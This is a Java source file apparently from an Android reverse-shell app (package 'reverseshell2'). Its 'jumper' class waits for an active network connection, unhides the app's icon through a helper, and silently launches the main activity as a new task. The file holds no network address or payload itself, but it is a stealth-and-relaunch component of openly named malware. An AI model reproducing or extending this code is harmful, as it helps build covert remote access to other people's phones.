package com.example.reverseshell2;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class jumper {
    Context context;

    public jumper(Context context) {
        this.context = context;
    }

    public void init(){
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if(cm.getActiveNetworkInfo() != null && cm.getActiveNetworkInfo().isConnected()){
            new functions(null).unHideAppIcon(context);
            Intent a = new Intent(context,MainActivity.class);
            a.addFlags(FLAG_ACTIVITY_NEW_TASK);
            a.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
            context.startActivity(a);
        }
    }
}
